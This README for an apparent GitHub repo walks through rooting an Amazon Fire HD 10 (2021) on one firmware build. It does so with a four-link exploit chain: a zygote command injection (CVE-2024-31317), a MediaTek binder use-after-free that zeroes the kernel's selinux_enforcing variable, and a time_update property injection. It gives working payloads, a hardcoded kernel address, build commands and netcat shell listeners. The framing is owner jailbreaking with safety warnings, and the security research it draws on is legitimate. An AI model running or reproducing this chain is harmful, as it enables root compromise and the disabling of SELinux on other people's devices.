# Rooting the Amazon Fire HD 10 (2021) — PS7329.3842N

**Device:** Fire HD 10 (2021, 11th gen) `trona` / KFTRWI, Fire OS **7.3.2.9** (build `PS7329.3842N`, 2024-01-19 — the firmware present on the verified device; newer builds exist, see docs/ADDRESS-TABLE.md), Android 9, kernel 4.4.146 aarch64, MediaTek MT8183, bootloader locked.

**Result:** `uid=0(root)` shell + SELinux Permissive, verified on **2-for-2 independent boots**, with zero kernel faults (pstore-audited). No bootloader unlock, no custom ROM — this is an *in-OS* temporary root, re-runnable at will.

> ⚠️ **WARNING — read before doing anything.**
>
> - This exploit performs **kernel memory writes**. A wrong write address is a
>   **silent no-op or a hard brick**: a write to a mapped-but-wrong `.bss` slot
>   returns "success" while nothing happens; a write to an unmapped address
>   panics the kernel.
> - There is **NO unbrick path** for 2021+ Fire tablets. BootROM download mode is
>   **fuse-disabled at the factory** — a hard brick is permanent, with no recovery
>   image and no service escape.
> - **Read this whole README first** — especially [§3 Stage the exploit
>   assets](#3-stage-the-exploit-assets) and [the address
>   gotcha](#the-address-gotcha-a-hardcoded-kernel-address) — plus
>   [TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md), before running anything.
> - You do this to **your own device, at your own risk**.

> This is a **build-verification and field report** for the excellent
> [voidnullvalue/SnuSnuRoot](https://github.com/voidnullvalue/SnuSnuRoot) chain.
> The upstream author verified the chain on **PS7331.4460N (Fire OS 7.3.3.1)**.
> **This repo adds: confirmation it works on PS7329.3842N (Fire OS 7.3.2.9), the
> correct `selinux_enforcing` address for that build, and the recovery pipeline
> to derive that address for any future firmware — without guessing.**

## Read before running

- [ ] **Verify the build is `PS7329.3842N`** (Settings → Device Options → About).
      The P2b write address is build-specific. On any other build the write is the
      classic wrong-address scenario from the warning above. Other builds work
      only after recovering their address via [ADDRESS-TABLE.md](docs/ADDRESS-TABLE.md).
- [ ] **Verify the deployed `.so` sha256.** The script's preflight enforces the
      sha256 of the deployed carrier library (default: the verified PS7329 build).
      If you rebuilt the `.so`, export `EXPECTED_SO_SHA256` first — see
      [§3](#3-stage-the-exploit-assets) and [§5](#5-run-the-chain).
- [ ] **Own the device and accept the risk.** Permanent-brick risk is real and
      irreversible (see the warning above).
- [ ] **Verify device targeting.** With more than one adb device attached,
      confirm `adb -s "$TAB" shell getprop serialno` returns *this* tablet before
      every run (see [§1](#1-what-you-need-prerequisites)).

## TL;DR

```bash
# 0. Prereqs: tablet + host on the same Wi-Fi, USB debugging enabled and authorized,
#    SnuSnuRoot cloned (see §One-time setup below)
git clone https://github.com/voidnullvalue/SnuSnuRoot.git ../SnuSnuRoot

# 1. Run the automated chain (stages the trigger, reboots, races the leak, verifies root)
./root-firehd10.sh 5        # 5 = max fresh-boot attempts

# 2. When the script logs `ROOT_WIN` and prints `*** ROOT: uid-0 listener live on 127.0.0.1:4325 ***`
#    (the success markers from `root-firehd10.sh`), connect to your root shell:
adb connect <tablet-ip>:5555
adb shell "printf 'id\nexit\n' | toybox nc -w 3 127.0.0.1 4325"
#   → uid=0(root) gid=1000(system) context=u:r:time_update:s0
```

> ⚠️ **Wi-Fi adb (port 5555) exposes the tablet to your LAN.** Only enable it on
> trusted networks (do NOT use hotel/airport/captive Wi-Fi). **Close it after
> the session** by either running `adb usb` from the USB side, or simply
> rebooting the tablet (`adb disconnect` is only a stopgap — the port is still
> listening on the device until reboot or `adb usb`). Full threat model in
> [§2 One-time setup](#2-one-time-setup).

The root is **temporary** (everything is in-memory; a reboot returns SELinux to
Enforcing). Re-run the script whenever root is needed again — it is deterministic
given a leak win, which happens on roughly 30–50% of fresh boots.

## What this gets you (and what it does not)

**Gets you:**

- A root shell (`uid=0`, context `u:r:time_update:s0`) on every successful run
- SELinux **Permissive** (in-memory, until reboot)
- `/system` remounted read-write — debloat, hosts-file blocking, persistent
  `/system` file changes
- Boot-time automation of your own payloads

**Does NOT get you (and will not, via this route):**

- Bootloader unlock
- TWRP or any custom recovery
- Magisk-on-boot / systemless root
- Custom ROMs / GSI / LineageOS

The 2021+ boot chain is closed (verified: bootROM fuse-disabled; `idme` unlock
needs an Amazon RSA-2048-PSS signature — 1M fuzzed signatures, 0 accepts per
independent audit). Root here is an *in-OS* foothold only.

## Contents

1. [What you need (prerequisites)](#1-what-you-need-prerequisites)
2. [One-time setup](#2-one-time-setup)
3. [Stage the exploit assets](#3-stage-the-exploit-assets)
4. [Prepare your payload](#4-prepare-your-payload)
5. [Run the chain](#5-run-the-chain)
6. [Post-root: what you can do](#6-post-root-what-you-can-do)
7. [Hygiene after a root session](#7-hygiene-after-a-root-session)
- [The four-link chain](#the-four-link-chain)
- [The address gotcha: a hardcoded kernel address](#the-address-gotcha-a-hardcoded-kernel-address)
- [Status and scope](#status-and-scope)
- [Legal](#legal) · [Backups](#backups) · [Reference files](#reference-files) · [Credits](#credits)

## 1. What you need (prerequisites)

- Fire HD 10 (2021) `trona`/KFTRWI on **Fire OS 7.3.2.9** (Settings → Device Options →
  About; build must start with `PS7329`). Other builds work but need the address from
  [ADDRESS-TABLE.md](docs/ADDRESS-TABLE.md).
- A Linux (or WSL2) host and the tablet on the **same Wi-Fi network**.
- USB debugging enabled and authorized:
  Settings → Device Options → About Fire Tablet → tap *Serial Number* 7× →
  back → *Developer Options* → enable *USB Debugging*; accept the RSA prompt.
- adb (platform-tools) on the host.
- A cloned [voidnullvalue/SnuSnuRoot](https://github.com/voidnullvalue/SnuSnuRoot).

**Targeting check (multiple devices).** `adb` commands without `-s` fail or hit
the wrong device when several are attached. Always export `TAB` (the script dies
without it) and verify the target before every run:

```bash
adb -s "$TAB" shell getprop serialno
```

If the tablet's DHCP lease changed, re-read the IP (Settings → Wi-Fi) and re-run
`adb connect <new-ip>:5555`.

## 2. One-time setup

```bash
git clone https://github.com/voidnullvalue/SnuSnuRoot.git /tmp/SnuSnuRoot
git clone https://github.com/<you>/fire-hd10-2021-root.git
cd fire-hd10-2021-root

# find the tablet's Wi-Fi IP (USB-attached; scriptable):
adb shell ip addr show wlan0
#   look for "inet 192.168.x.x/..." under wlan0 (manual fallback: Settings →
#   Wi-Fi → current network)
adb tcpip 5555                       # run while connected over USB once
adb connect <tablet-ip>:5555
adb devices                          # must list <tablet-ip>:5555  device
```

> ⚠️ **Wi-Fi adb (port 5555) exposes the tablet to your LAN.** Any host that can
> reach the tablet's IP and present a recognized adb key can run shell commands
> as the `shell(2000)` user, install/uninstall packages, push/pull files, and
> re-arm the channel. Treat the Wi-Fi adb session like an open SSH port: only
> enable it on trusted networks (do NOT enable on hotel/airport/captive Wi-Fi),
> and **close it after the session** by either running `adb usb` from the USB
> side, or simply rebooting the tablet (adbd returns to USB mode at boot).
> `adb disconnect <tablet-ip>:5555` from the host is a stopgap; the port is
> still listening on the tablet until reboot or `adb usb`.

Set the environment the script expects (or edit the variables at the top):

```bash
export ADB="$(which adb)"
export TAB="<tablet-ip>:5555"
```

## 3. Stage the exploit assets (from SnuSnuRoot, once per device)

```bash
export ADB; export TAB
cd /tmp/SnuSnuRoot
ADB="$ADB" bash scripts/root_poc.sh status      # sanity: device reachable, waiter state
ADB="$ADB" bash scripts/stage_initial_root_assets.sh install
# stages agent.jar + libhwbinder_target*.so + carrier_launcher.sh into
# /data/securedStorageLocation/codex.amazon.jni.v51/
```

**CRITICAL for PS7329:** the upstream-prebuilt `libhwbinder_target.arm64-v8a.so`
carries the **PS7331** address `0xffffff8009971668`, which is wrong here. Rebuild the
JNI library with the correct address from [ADDRESS-TABLE.md](docs/ADDRESS-TABLE.md).

**Note on the address below:** the value `0xffffff800996d668` is shown as a concrete
example for **PS7329.3842N only**. The address is **BUILD-SPECIFIC** — take yours
from [ADDRESS-TABLE.md](docs/ADDRESS-TABLE.md) and verify it with the pipeline documented
there. **Never copy the example literally for a different build.**

```bash
cd /tmp/SnuSnuRoot/poc/hwbinder-secctx-exploit

# 1. Set the address (parameterized; default below is the PS7329 example).
SELINUX_ENFORCING_ADDRESS=${SELINUX_ENFORCING_ADDRESS:-0xffffff800996d668}

# 2. Patch the constant (matches any 0x... literal, defensive against prior edits).
sed -i "s/SELINUX_ENFORCING_ADDRESS UINT64_C(0[xX][0-9a-fA-F]*)/SELINUX_ENFORCING_ADDRESS UINT64_C(${SELINUX_ENFORCING_ADDRESS})/" controlled_target.c

# 3. VERIFY the patch landed — must show YOUR value, not the upstream PS7331 default.
grep -n "SELINUX_ENFORCING_ADDRESS" controlled_target.c
#   expected: SELINUX_ENFORCING_ADDRESS UINT64_C(0xffffff800996d668)   (for PS7329)
#   if you see 0xffffff8009971668, the upstream default never got replaced — STOP.
```

**Build toolchain — important.** A plain `aarch64-linux-gnu-gcc` (glibc) build
produces a `.so` that **may fail to load on Android 9 (bionic libc)**, which is
exactly the runtime on this Fire HD 10 (2021). Use one of:

```bash
# RECOMMENDED — NDK clang targeting Android API 28 (matches upstream SnuSnuRoot
# build.sh; produces a bionic-compatible .so):
aarch64-linux-android28-clang -shared -fPIC -O2 -DCONTROLLED_TARGET_LIBRARY \
  -Wl,-soname,libhwbinder_target.so -o build/libhwbinder_target_ps7329.so \
  controlled_target.c jni_wrapper.c -pthread

# ALTERNATIVE — musl-gcc statically-linked for a standalone carrier (works on
# bionic; bigger .so; only useful if NDK is unavailable):
aarch64-linux-musl-gcc -static -shared -fPIC -O2 -DCONTROLLED_TARGET_LIBRARY \
  -Wl,-soname,libhwbinder_target.so -o build/libhwbinder_target_ps7329.so \
  controlled_target.c jni_wrapper.c -pthread
```

See [TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md) §13 (".so fails to load / dlopen
errors") for diagnosis if `dlopen` rejects the .so on-device.

Then install it into the staged asset dir **via the uid-1000 channel** (the dir is
system-owned; shell cannot write it directly). Stage the P1 payload first.

**Reconciling the two staging paths.** Upstream's
`stage_initial_root_assets.sh install` stages the **upstream prebuilt**
`libhwbinder_target.arm64-v8a.so`, which carries the **PS7331** address and is
**WRONG for PS7329**. The manual base64 install below **overwrites** it with the
corrected build. Order matters: run upstream staging first (it sets up the
asset directory tree and perms), then run the base64 install to overwrite the JNI
.so with the build-specific one. Do NOT skip upstream staging — it also stages
`agent.jar` and `carrier_launcher.sh` that the script depends on.

Stage `/data/local/tmp/inject.txt` (the P1 zygote payload) before the injection.
`root-firehd10.sh` stages it automatically on every attempt (its `stage_inject()`
function). Manual staging below is a fallback / sanity-check option:

```bash
# OPTION A — push from the upstream checkout:
# (if poc/inject.txt is not present in your upstream checkout, use option B —
# some SnuSnuRoot checkouts do not stage a device-side copy)
adb push /tmp/SnuSnuRoot/poc/inject.txt /data/local/tmp/inject.txt

# OPTION B — write the uid-1000 channel payload by hand. This MUST byte-match
# root-firehd10.sh stage_inject()'s heredoc (uids 1000/1000, runnetcat,
# platform seinfo, nc listener on 4321):
cat > /tmp/inject.txt <<'INJECT_EOF'
LClass1;->method1(
10
--runtime-args
--setuid=1000
--setgid=1000
--runtime-flags=2049
--mount-external-full
--setgroups=3003
--nice-name=runnetcat
--seinfo=platform:targetSdkVersion=28:complete
--invoke-with
toybox nc -s 127.0.0.1 -p 4321 -L /system/bin/sh -l;
INJECT_EOF
adb push /tmp/inject.txt /data/local/tmp/inject.txt
adb shell "toybox chmod 0644 /data/local/tmp/inject.txt"
# verify the on-device copy exists:
adb shell "toybox wc -c /data/local/tmp/inject.txt"
```

After base64-installing your build, capture the printed sha256 and export it
before running the script in §5:

```bash
export EXPECTED_SO_SHA256=$(sha256sum build/libhwbinder_target_ps7329.so | awk '{print $1}')
```

(The script's default `EXPECTED_SO_SHA256` is the author's own verified PS7329
build hash — `a6008a84…`, see `evidence/deployed-so-sha256.txt`. If you rebuilt
the `.so` as instructed above, yours will differ and preflight will fail without
this export.)

Then arm the P1 channel and overwrite the upstream prebuilt .so with the
corrected build:

```bash
adb shell 'V=$(cat /data/local/tmp/inject.txt); settings put global hidden_api_blacklist_exemptions "$V"; settings delete global hidden_api_blacklist_exemptions'
sleep 3
B64=$(base64 -w0 build/libhwbinder_target_ps7329.so)
printf 'echo %s | toybox base64 -d > /data/securedStorageLocation/codex.amazon.jni.v51/libhwbinder_target.arm64-v8a.so && chmod 0555 /data/securedStorageLocation/codex.amazon.jni.v51/libhwbinder_target.arm64-v8a.so && toybox sha256sum /data/securedStorageLocation/codex.amazon.jni.v51/libhwbinder_target.arm64-v8a.so\nexit\n' "$B64" | adb shell "toybox nc -w 20 127.0.0.1 4321"
# the printed sha256 must match your local patched build (this REPLACES the
# upstream-prebuilt .so left by stage_initial_root_assets.sh with your
# build-specific build)
```

## 4. Prepare your payload

`rootsvc_payload_root.sh` in this repo binds a root shell listener on
`127.0.0.1:4325`. Edit it to run a different payload. The chain copies it to
`/data/local/tmp/__reroot_payload.sh` on the device automatically.

## 5. Run the chain

**Optional pre-flight (recommended on first contact with a new device):**
`DRY_RUN=1 ./root-firehd10.sh 5` executes the entire chain — preflight, staging,
arming, reboot, carrier spawn, and the stateful leak — but **exits before the
kernel write** (`[DRY_RUN] would run HWBINDER_STATEFUL_WRITE now`). Use it to
validate connectivity, staging, and the leak win without performing any kernel
memory write.

```bash
cd fire-hd10-2021-root
./root-firehd10.sh 5
```

**sha256 preflight (automatic, enforced).** Before the first attempt the script
pulls the deployed `.so` and compares its sha256 against `EXPECTED_SO_SHA256`
(default: the verified PS7329 build, `a6008a84…` — see
`evidence/deployed-so-sha256.txt`). A rebuilt `.so` must export its own hash
([§3](#3-stage-the-exploit-assets)) or preflight exits. The address itself is
compiled into `movz`/`movk` instruction immediates — it cannot be grepped from
the binary — so the hash is the only automated check that the right build is
deployed.

Watch for:

```
armed on channel attempt 1 — rebooting IMMEDIATELY ...
boot ok; spawning carrier
carrier PONG; leak
leak: HWBINDER_STATEFUL result=0x5000000000000000 file=0x4444444444444444 node=0x...
LEAK CONFIRMED — running write
write: HWBINDER_STATEFUL_WRITE result=0x5100000000000000
getenforce=Permissive
root_probe_4325=0
*** ROOT: uid-0 listener live on 127.0.0.1:4325 ***
```

Leak failure codes (both are normal, not errors in your setup):

- `result=0x5000003d…` (ENODATA): the grooming race was lost — the spray did not
  reclaim the freed node. Expected on ~50–70% of fresh boots; the script reboots
  and retries.
- `result=0x40000072…` (EALREADY): the stateful primitive is spent for this
  boot; every later attempt on the same boot fails identically. Reboot.

**Immediate reboot on arm.** The P3 trigger embeds a 30-second fuse —
`x[$(sleep 30;/system/bin/sh /data/securedStorageLocation/w/b)]000`. Once the
property is armed and a `time_update` instance parses it, the fuse path runs 30
seconds later, *including on the staging boot*. The script reboots the device
the moment `getprop` confirms the arm, so the waiter runs on a fresh boot where
it parses as root (init `user root`) and waits for Permissive.

**STOP on any kernel panic.** If the device panics or bootloops, stop. A panic
means the write target is wrong for this build — re-derive the address via
[ADDRESS-TABLE.md](docs/ADDRESS-TABLE.md) before any further attempt. (The P3
waiter only ever waits; it never reboots on its own, so a bootloop is not
self-perpetuating — let it settle, then `adb wait-for-device` from USB. There is
no hard-brick recovery for this device.)

Then:

```bash
adb shell "printf 'id\nexit\n' | toybox nc -w 3 127.0.0.1 4325"
#   uid=0(root) gid=1000(system) groups=1000(system),2000(shell) context=u:r:time_update:s0
```

## 6. Post-root: what you can do

- `toybox mount -o remount,rw /dev/root /` — /system becomes writable (dm-verity is
  in EIO mode on this build; it does not block the remount under kernel root).
- Delete `/system` APK dirs to debloat (back them up first!).
- Edit `/system/etc/hosts`.
- The root is **in-memory**: a reboot returns SELinux to Enforcing and the listener
  dies. Re-run §5 whenever needed. `/system` file changes persist.

## 7. Hygiene after a root session

```bash
adb shell "settings get global snusnu_persist_enabled"   # only present if you installed the optional SnuSnuRoot persistence app; absent = actor not installed
adb shell "getprop persist.sys.saved_time"               # should be numeric
adb shell "rm -f /data/securedStorageLocation/w/b2 \
                 /data/securedStorageLocation/w/b3"      # probe leftovers, if any
```

```bash
# stop the root listener without rebooting (if it is still alive):
adb shell "kill $(cat /data/securedStorageLocation/rootsvc/pid.txt)"
```

Hosts restoration: the Amazon blocklist in `/system/etc/hosts` persists across
reboots. To revert it, extract `system-apks-backup.tar.gz` on the host, then
`adb push <extracted>/system/etc/hosts /data/local/tmp/hosts-orig` and copy it
back over `/system/etc/hosts` during a root session.

The P1 channel, the carrier, and the 4325 listener all die at reboot by
themselves. When in doubt, `adb reboot` is the full cleanup: it clears the root
listener, SELinux Permissive, and all armed-trigger residue (the `/system` file
changes persist — they are byte-level, not mount-level).

## The four-link chain

| Link | Bug | Role | Verified on PS7329? |
|---|---|---|---|
| P1 | CVE-2024-31317 — Zygote `hidden_api_blacklist_exemptions` command injection | Spawns an attacker-controlled `app_process` carrier as `uid 1000` / `amazon_app` | ✅ |
| P2a | CVE-2019-2181 — MediaTek binder UAF (stateful leak) | Leaks a kernel pointer + primes the write primitive | ✅ (~30–50% per boot, grooming race) |
| P2b | same primitive, write step | NULLs `selinux_enforcing` → **SELinux Permissive** (in-memory) | ✅ with the correct address (see below) |
| P3 | Amazon `time_update` service — unquoted `date -u @$(...)` on a persisted property | **Boot-time code execution as root** (`u:r:time_update:s0`); waits for Permissive, then launches your payload | ✅ |

Chain order per boot: arm the P3 trigger → reboot → `time_update` (running as **root**
via init `user root`) parses the trigger and starts a waiter that polls `getenforce`
→ P1 spawns the carrier → P2a/P2b flip SELinux → the waiter sees Permissive and
launches the payload **as uid 0**.

## The address gotcha: a hardcoded kernel address

The upstream binary hardcodes `selinux_enforcing`'s virtual address from the
**PS7331** build. On PS7329 that address points somewhere harmless — the write
"returns success" but SELinux stays Enforcing, and nothing tells you why. This is
the most commonly misdiagnosed failure mode of the whole chain.

`selinux_enforcing` is a zero-initialized `.bss` variable, so it does **not** exist
in the kernel image file, and this kernel ships `CONFIG_KALLSYMS_ALL=n` (data
symbols excluded from kallsyms). The address cannot be read out of the image or
the symbol table. It *can* be read out of the **code** that writes the variable:

```
enforcing_setup (PS7329, VA 0xffffff80091b9e78):
  ffffff80091b9ea4:  90003da9   adrp  x9, 0xffffff800996d000
  ffffff80091b9eb0:  b9066928   str   w8, [x9, #1640]        → selinux_enforcing = 0xffffff800996d668
```

Cross-validation: on this kernel `PA = (VA & 0xffffffff) + 0x38000000` maps the
disassembly-derived VA to the runtime-verified PA `0x41969668` published by
ericpardee/fire-hd-ownership for PS7326 — exact match. (The `+0x38000000` term is
an empirically-fit PHYS_OFFSET anchor, not a portable formula; details in
[ADDRESS-TABLE.md](docs/ADDRESS-TABLE.md).)

See **[ADDRESS-TABLE.md](docs/ADDRESS-TABLE.md)** for the full per-build table and the
reproducible recovery pipeline (official OTA images are served openly from Amazon's
S3; `unzip` → `gunzip` at offset 0x800 → `vmlinux-to-elf` → `objdump -d enforcing_setup`).
That pipeline is the durable contribution of this repo: when Amazon ships a new build,
the new address is recoverable in ~10 minutes instead of by guessing.

**The only positive oracle is the SELinux flip itself.** A wrong-but-mapped write
is silent: success status, no panic, no flip, clean pstore. Treat
`getenforce=Permissive` after the write as the sole confirmation that the address
is correct for the build. Never probe neighbor addresses.

## Status and scope

- **Works:** temporary root, SELinux Permissive, `/system` remount rw, debloat (deleting `/system` APK dirs), hosts-file blocking, boot-time automation of your own payloads.
- **Does not work, and will not via this route:** bootloader unlock, TWRP, Magisk-on-boot, custom ROMs/GSI, LineageOS. The 2021+ boot chain is closed (verified: bootROM fuse-disabled, `idme` unlock needs an Amazon RSA-2048-PSS signature, 1M fuzzed signatures / 0 accepts per independent audit). Root here is an *in-OS* foothold only.
- **Verified hardware/build:** Fire HD 10 (2021) KFTRWI, PS7329.3842N only. The chain is build-specific at the P2b address; other builds need the ADDRESS-TABLE.md recovery step first.

## Legal

Jailbreaking your own device for interoperability is lawful in the US (DMCA 1201
exemption) and broadly tolerated elsewhere; the underlying research was all
published by its authors first. This repo redistributes **no Amazon proprietary
binaries** — only offsets, original scripts, and links. Cite the researchers in
[CREDITS.md](CREDITS.md) if you build on this.

## Backups

`system-apks-backup.tar.gz` (879 MB, full `/system/app` + `/system/priv-app` snapshot
taken under root before any deletion) is intentionally not committed — keep it on your
host next to the repo. Per-APK sha256s live in `evidence/` and `pkgmap`-style records.

## Reference files

| File | Purpose |
|---|---|
| [root-firehd10.sh](root-firehd10.sh) | The automated chain (staging, reboot, carrier, leak, write, verify) |
| [rootsvc_payload_root.sh](rootsvc_payload_root.sh) | The uid-0 payload (root shell listener on 127.0.0.1:4325) |
| [docs/ADDRESS-TABLE.md](docs/ADDRESS-TABLE.md) | Per-build `selinux_enforcing` addresses + the recovery pipeline |
| [docs/TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md) | Every failure mode encountered on PS7329.3842N, with diagnosis and fix |
| [docs/VERIFICATION-PS7329.md](docs/VERIFICATION-PS7329.md) | The full verification report for this build |
| [evidence/](evidence/) | Raw artifacts backing every claim (run transcript, pstore audit, `getenforce` transitions, deployed-`.so` sha256). The verification report cites this directory; the directory is the source of truth. |
| [CREDITS.md](CREDITS.md) | Who did the actual research — read it |

## Credits

All research provenance and attribution lives in [CREDITS.md](CREDITS.md). The
exploit chain itself is voidnullvalue/SnuSnuRoot; this repo verifies it on
PS7329.3842N and documents the build-specific address. Read CREDITS.md before
building on this work.
